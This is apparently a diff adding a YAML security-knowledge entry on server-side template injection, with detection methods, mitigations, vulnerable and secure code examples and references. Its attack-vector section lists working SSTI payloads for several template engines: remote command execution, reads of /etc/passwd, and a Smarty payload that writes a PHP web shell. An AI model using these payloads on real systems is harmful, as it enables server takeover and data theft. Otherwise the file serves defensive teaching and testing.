@@ -1,0 +1,335 @@
+name: "Server-Side Template Injection (SSTI)"
+category: "Injection"
+severity: "CRITICAL"
+cwe: "CWE-94"
+owasp: "A03:2021 - Injection"
+
+description: |
+  Server-Side Template Injection (SSTI) occurs when user input is embedded into template engines without 
+  proper sanitization. Template engines like Jinja2, Twig, Freemarker, Velocity, and others allow dynamic 
+  content generation but can execute arbitrary code if user input is directly embedded. Attackers can exploit 
+  SSTI to achieve remote code execution, read sensitive files, and completely compromise the server. This 
+  vulnerability is particularly dangerous because template engines often have access to powerful objects and 
+  methods that can interact with the underlying operating system.
+
+common_patterns:
+  - "User input directly embedded in templates"
+  - "Dynamic template generation from user input"
+  - "Template rendering with unsanitized data"
+  - "Custom template engines without sandboxing"
+  - "Eval-like functionality in templates"
+  - "Server-side rendering with user-controlled templates"
+  - "Email template generation"
+  - "PDF generation with templates"
+  - "Report generation systems"
+
+attack_vectors:
+  detection_payloads:
+    description: "Payloads to detect SSTI"
+    payloads:
+      - "{{7*7}}" # Should output 49
+      - "${7*7}" # Should output 49
+      - "<%= 7*7 %>" # Should output 49
+      - "${{7*7}}" # Should output 49
+      - "#{7*7}" # Should output 49
+      - "*{7*7}" # Should output 49
+  
+  jinja2_python:
+    description: "Jinja2 (Python) exploitation"
+    payloads:
+      - "{{config.items()}}" # Leak configuration
+      - "{{''.__class__.__mro__[1].__subclasses__()}}" # List subclasses
+      - "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}" # RCE
+      - "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" # RCE
+      - "{{cycler.__init__.__globals__.os.popen('id').read()}}" # RCE
+      - "{{joiner.__init__.__globals__.os.popen('id').read()}}" # RCE
+  
+  twig_php:
+    description: "Twig (PHP) exploitation"
+    payloads:
+      - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" # RCE
+      - "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}" # RCE
+      - "{{['id']|filter('system')}}" # RCE
+      - "{{['cat /etc/passwd']|filter('system')}}" # RCE
+  
+  freemarker_java:
+    description: "Freemarker (Java) exploitation"
+    payloads:
+      - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}" # RCE
+      - "<#assign ex='freemarker.template.utility.ObjectConstructor'?new()>${ex('java.lang.ProcessBuilder','id').start()}" # RCE
+      - "${'freemarker.template.utility.Execute'?new()('id')}" # RCE
+  
+  velocity_java:
+    description: "Velocity (Java) exploitation"
+    payloads:
+      - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end" # RCE
+  
+  erb_ruby:
+    description: "ERB (Ruby) exploitation"
+    payloads:
+      - "<%= system('id') %>" # RCE
+      - "<%= `id` %>" # RCE
+      - "<%= IO.popen('id').readlines() %>" # RCE
+      - "<%= File.open('/etc/passwd').read %>" # File read
+  
+  smarty_php:
+    description: "Smarty (PHP) exploitation"
+    payloads:
+      - "{system('id')}" # RCE
+      - "{php}system('id');{/php}" # RCE (if PHP tags enabled)
+      - "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET[cmd]); ?>',self::clearConfig())}" # Write shell
+
+exploitation_requirements:
+  - "Application uses template engine"
+  - "User input is embedded in templates"
+  - "Insufficient input sanitization"
+  - "Template engine not properly sandboxed"
+
+detection_methods:
+  static_analysis:
+    - "Review template rendering code"
+    - "Check for user input in template strings"
+    - "Verify template sandboxing configuration"
+    - "Check for dynamic template generation"
+    - "Review template engine security settings"
+  
+  dynamic_testing:
+    - "Test with mathematical expressions ({{7*7}})"
+    - "Test with template-specific syntax"
+    - "Test with polyglot payloads"
+    - "Monitor for error messages revealing template engine"
+    - "Test with time-based payloads"
+    - "Test with out-of-band data exfiltration"
+  
+  code_review_checklist:
+    - "Is user input sanitized before template rendering?"
+    - "Is template engine properly sandboxed?"
+    - "Are dangerous functions/methods disabled?"
+    - "Is template compilation separated from rendering?"
+    - "Are templates stored separately from user input?"
+    - "Is template engine updated to latest version?"
+
+mitigation_strategies:
+  avoid_user_input:
+    - "Never embed user input directly in templates"
+    - "Use template parameters instead of string concatenation"
+    - "Separate template logic from user data"
+    - "Use pre-compiled templates"
+  
+  sandboxing:
+    - "Enable template engine sandboxing"
+    - "Disable dangerous functions/methods"
+    - "Restrict access to sensitive objects"
+    - "Use safe mode if available"
+    - "Implement custom security policy"
+  
+  input_validation:
+    - "Validate and sanitize all user input"
+    - "Whitelist allowed characters"
+    - "Reject template syntax characters"
+    - "Use context-aware output encoding"
+    - "Implement Content Security Policy"
+  
+  secure_configuration:
+    - "Disable auto-escaping bypass"
+    - "Disable PHP/code execution in templates"
+    - "Restrict file system access"
+    - "Use latest template engine version"
+    - "Follow security best practices for specific engine"
+  
+  additional_controls:
+    - "Log all template rendering operations"
+    - "Monitor for suspicious patterns"
+    - "Implement rate limiting"
+    - "Use Web Application Firewall (WAF)"
+    - "Run application with minimal privileges"
+
+severity_factors:
+  critical:
+    - "Remote code execution possible"
+    - "No authentication required"
+    - "Direct internet exposure"
+    - "Access to sensitive data"
+  
+  high:
+    - "RCE with authentication"
+    - "File read/write possible"
+    - "Information disclosure"
+  
+  medium:
+    - "Limited template injection"
+    - "Strong authentication required"
+    - "Sandboxed environment"
+
+business_impact:
+  - "Complete server compromise"
+  - "Remote code execution"
+  - "Data breach and exfiltration"
+  - "Source code disclosure"
+  - "Configuration file exposure"
+  - "Malware installation"
+  - "Denial of service"
+  - "Compliance violations"
+  - "Reputational damage"
+
+compliance_considerations:
+  pci_dss:
+    - "Requirement 6.5.1: Injection flaws"
+  
+  owasp_top_10:
+    - "A03:2021 - Injection"
+  
+  nist:
+    - "SI-10: Information Input Validation"
+    - "AC-6: Least Privilege"
+  
+  gdpr:
+    - "Article 32: Security of processing"
+
+testing_tools:
+  - "Burp Suite (Intruder with SSTI payloads)"
+  - "OWASP ZAP"
+  - "tplmap (automated SSTI scanner)"
+  - "SSTImap (SSTI exploitation tool)"
+  - "Wfuzz with SSTI wordlists"
+
+template_engines:
+  python:
+    - "Jinja2"
+    - "Mako"
+    - "Tornado"
+    - "Django Templates"
+  
+  php:
+    - "Twig"
+    - "Smarty"
+    - "Blade (Laravel)"
+    - "Plates"
+  
+  java:
+    - "Freemarker"
+    - "Velocity"
+    - "Thymeleaf"
+    - "Pebble"
+  
+  ruby:
+    - "ERB"
+    - "Slim"
+    - "Haml"
+    - "Liquid"
+  
+  javascript:
+    - "Handlebars"
+    - "Pug (Jade)"
+    - "EJS"
+    - "Nunjucks"
+
+code_examples:
+  vulnerable_python_jinja2: |
+    # VULNERABLE: User input in template string
+    from jinja2 import Template
+    
+    @app.route('/hello')
+    def hello():
+        name = request.args.get('name')
+        template = Template('Hello ' + name + '!')
+        return template.render()
+  
+  secure_python_jinja2: |
+    # SECURE: Use template parameters
+    from jinja2 import Template
+    
+    @app.route('/hello')
+    def hello():
+        name = request.args.get('name')
+        template = Template('Hello {{ name }}!')
+        return template.render(name=name)
+    
+    # Even better: Use pre-compiled templates
+    from flask import render_template_string
+    
+    @app.route('/hello')
+    def hello():
+        name = request.args.get('name')
+        # Validate input
+        if not name.isalnum():
+            return "Invalid name", 400
+        return render_template_string('Hello {{ name }}!', name=name)
+  
+  vulnerable_php_twig: |
+    <?php
+    // VULNERABLE: User input in template string
+    $loader = new \Twig\Loader\ArrayLoader([]);
+    $twig = new \Twig\Environment($loader);
+    
+    $name = $_GET['name'];
+    $template = $twig->createTemplate('Hello ' . $name . '!');
+    echo $template->render([]);
+    ?>
+  
+  secure_php_twig: |
+    <?php
+    // SECURE: Use template parameters
+    $loader = new \Twig\Loader\ArrayLoader([
+        'hello' => 'Hello {{ name }}!',
+    ]);
+    $twig = new \Twig\Environment($loader, [
+        'autoescape' => 'html',
+        'strict_variables' => true,
+    ]);
+    
+    $name = $_GET['name'];
+    // Validate input
+    if (!ctype_alnum($name)) {
+        die('Invalid name');
+    }
+    
+    echo $twig->render('hello', ['name' => $name]);
+    ?>
+  
+  vulnerable_java_freemarker: |
+    // VULNERABLE: User input in template
+    Configuration cfg = new Configuration();
+    String templateStr = "Hello " + request.getParameter("name") + "!";
+    Template template = new Template("name", new StringReader(templateStr), cfg);
+    template.process(dataModel, out);
+  
+  secure_java_freemarker: |
+    // SECURE: Use template parameters with sandboxing
+    Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
+    cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
+    cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);
+    
+    String name = request.getParameter("name");
+    // Validate input
+    if (!name.matches("[a-zA-Z0-9]+")) {
+        throw new IllegalArgumentException("Invalid name");
+    }
+    
+    Template template = cfg.getTemplate("hello.ftl");
+    Map<String, Object> dataModel = new HashMap<>();
+    dataModel.put("name", name);
+    template.process(dataModel, out);
+
+prevention_checklist:
+  - "[ ] Never embed user input directly in templates"
+  - "[ ] Use template parameters instead"
+  - "[ ] Enable template engine sandboxing"
+  - "[ ] Disable dangerous functions/methods"
+  - "[ ] Validate and sanitize user input"
+  - "[ ] Use pre-compiled templates"
+  - "[ ] Implement Content Security Policy"
+  - "[ ] Run with minimal privileges"
+  - "[ ] Log template rendering operations"
+  - "[ ] Use latest template engine version"
+  - "[ ] Follow engine-specific security guidelines"
+  - "[ ] Implement rate limiting"
+  - "[ ] Use Web Application Firewall"
+
+references:
+  - "PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection"
+  - "OWASP SSTI: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection"
+  - "CWE-94: https://cwe.mitre.org/data/definitions/94.html"
+  - "PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+  - "HackerOne SSTI Reports: https://hackerone.com/reports?query=ssti"
+
